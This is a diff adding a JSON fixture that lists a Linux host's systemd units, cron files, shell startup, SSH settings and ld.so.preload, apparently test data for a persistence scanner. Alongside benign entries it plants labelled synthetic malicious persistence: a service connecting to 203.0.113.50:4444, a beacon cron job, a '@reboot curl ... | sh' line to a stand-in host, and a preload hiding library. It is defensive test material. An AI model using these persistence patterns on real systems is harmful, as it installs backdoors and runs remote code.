@@ -1,0 +1,151 @@
+[
+  {
+    "content": "[Unit]\nDescription=A high performance web server\nAfter=network.target\n\n[Service]\nType=forking\nExecStart=/usr/sbin/nginx -g 'daemon on; master_process on;'\nExecReload=/usr/sbin/nginx -s reload\n\n[Install]\nWantedBy=multi-user.target\n",
+    "kind": "systemd_service",
+    "mode": "0644",
+    "mtime": "2025-08-01T10:00:00Z",
+    "owner": "root",
+    "path": "/etc/systemd/system/nginx.service",
+    "referenced_paths_exist": {
+      "/usr/sbin/nginx": true
+    },
+    "scope": "system",
+    "sha256": "7d11e8b6b50d87fb5e7a7fbe687cc63824c79aa9dc2fad49d706280e6638e044",
+    "size": 230
+  },
+  {
+    "content": "[Unit]\nDescription=Legacy sync job (software removed, unit left behind)\n\n[Service]\nExecStart=/opt/legacy/sync.sh --all\n\n[Install]\nWantedBy=multi-user.target\n",
+    "kind": "systemd_service",
+    "mode": "0644",
+    "mtime": "2025-08-01T10:00:00Z",
+    "owner": "root",
+    "path": "/etc/systemd/system/legacy-sync.service",
+    "referenced_paths_exist": {
+      "/opt/legacy/sync.sh": false
+    },
+    "scope": "system",
+    "sha256": "ec9f36f433ee1bc537741dae96030b0ab4a8a683708b3d4f8457c502c7bfa74f",
+    "size": 157
+  },
+  {
+    "content": "[Unit]\nDescription=Daily apt download activities\n\n[Timer]\nOnCalendar=*-*-* 6,18:00\nRandomizedDelaySec=12h\nPersistent=true\n\n[Install]\nWantedBy=timers.target\n",
+    "kind": "systemd_timer",
+    "mode": "0644",
+    "mtime": "2025-08-01T10:00:00Z",
+    "owner": "root",
+    "path": "/etc/systemd/system/apt-daily.timer",
+    "referenced_paths_exist": {},
+    "scope": "system",
+    "sha256": "0075e974af4e3a94757e219ba50ccb8348d4d1a8834d938f6cc9b1f4fd1db4e5",
+    "size": 156
+  },
+  {
+    "content": "[Unit]\nDescription=System Update Helper (SYNTHETIC EXAMPLE)\n\n[Service]\nExecStart=/tmp/.cache/updater --connect 203.0.113.50:4444 --token s3cr3t-synthetic-token\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n",
+    "kind": "systemd_service",
+    "mode": "0644",
+    "mtime": "2025-10-14T03:20:00Z",
+    "owner": "root",
+    "path": "/etc/systemd/system/sys-update.service",
+    "referenced_paths_exist": {
+      "/tmp/.cache/updater": true
+    },
+    "scope": "system",
+    "sha256": "aa05514e49508b5757bf0bc8c63e02b6f6236cd73103c22747478dfe610281d0",
+    "size": 213
+  },
+  {
+    "content": "[Unit]\nDescription=Run System Update Helper\n\n[Timer]\nOnBootSec=2min\nOnUnitActiveSec=10min\nUnit=sys-update.service\n\n[Install]\nWantedBy=timers.target\n",
+    "kind": "systemd_timer",
+    "mode": "0644",
+    "mtime": "2025-10-14T03:20:30Z",
+    "owner": "root",
+    "path": "/etc/systemd/system/sys-update.timer",
+    "referenced_paths_exist": {},
+    "scope": "system",
+    "sha256": "7e93cb8d9d8b0db76653d257d87ce91afcf4784c832f7aba4fadbb02109d63dc",
+    "size": 148
+  },
+  {
+    "content": "# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n",
+    "has_user_field": true,
+    "kind": "cron_file",
+    "mode": "0644",
+    "mtime": "2025-08-01T10:00:00Z",
+    "owner": "root",
+    "path": "/etc/crontab",
+    "referenced_paths_exist": {},
+    "sha256": "8e53acb0a8df27099cfd7e420b6de3fc497b706cc140253dd57e8ba2ef3abedc",
+    "size": 110
+  },
+  {
+    "content": "0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n",
+    "has_user_field": true,
+    "kind": "cron_file",
+    "mode": "0644",
+    "mtime": "2025-08-01T10:00:00Z",
+    "owner": "root",
+    "path": "/etc/cron.d/logrotate",
+    "referenced_paths_exist": {
+      "/usr/sbin/logrotate": true
+    },
+    "sha256": "40917454d3bdbbbd9ec32970b9cd8a54af3a21e7eeb6204ca481df18423b5ad2",
+    "size": 55
+  },
+  {
+    "content": "# synthetic example\n*/5 * * * * root /tmp/.cache/updater --beacon\n@reboot root curl -s http://bad-update.example.test/x.sh | sh\n",
+    "has_user_field": true,
+    "kind": "cron_file",
+    "mode": "0644",
+    "mtime": "2025-10-14T03:21:00Z",
+    "owner": "root",
+    "path": "/etc/cron.d/sysupdate",
+    "referenced_paths_exist": {
+      "/tmp/.cache/updater": true
+    },
+    "sha256": "490ee954224c9d71ba54d432d51ef03dd21c3c1af256435a0cbb1df24ce249a4",
+    "size": 128
+  },
+  {
+    "content": "# ~/.bashrc\nalias ll='ls -la'\nexport PATH=$HOME/bin:$PATH\n",
+    "kind": "shell_startup",
+    "mode": "0644",
+    "mtime": "2025-10-13T18:00:00Z",
+    "owner": "alice",
+    "path": "/home/alice/.bashrc",
+    "referenced_paths_exist": {},
+    "sha256": "40e92e756c1215f7c367afbabd9746810be83a6768dc8d16cf76f97f280346ba",
+    "size": 58
+  },
+  {
+    "content": "PermitRootLogin no\nPasswordAuthentication yes\n",
+    "kind": "ssh_config",
+    "mode": "0644",
+    "mtime": "2025-08-01T10:00:00Z",
+    "owner": "root",
+    "path": "/etc/ssh/sshd_config",
+    "referenced_paths_exist": {},
+    "sha256": "54af76d6eb22ce2d95b0cdf8ec5598ed3ad93d34ae4ab48619c36877ccafe79f",
+    "size": 46
+  },
+  {
+    "key_count": 2,
+    "kind": "ssh_authorized_keys",
+    "mode": "0600",
+    "mtime": "2025-10-14T03:19:00Z",
+    "owner": "alice",
+    "path": "/home/alice/.ssh/authorized_keys",
+    "sha256": "a846eaf4944ecd25373d4993997e2b926af4c1779262df9672cfe3837887b6fc",
+    "size": 90
+  },
+  {
+    "content": "/usr/local/lib/libhide-synthetic.so\n",
+    "kind": "ld_preload",
+    "mode": "0644",
+    "mtime": "2025-10-14T03:22:00Z",
+    "owner": "root",
+    "path": "/etc/ld.so.preload",
+    "referenced_paths_exist": {},
+    "sha256": "13e54f4c44b3b1da7a556d27b3a85a38500dba511d74fde2ed96f2caa60b310c",
+    "size": 36
+  }
+]
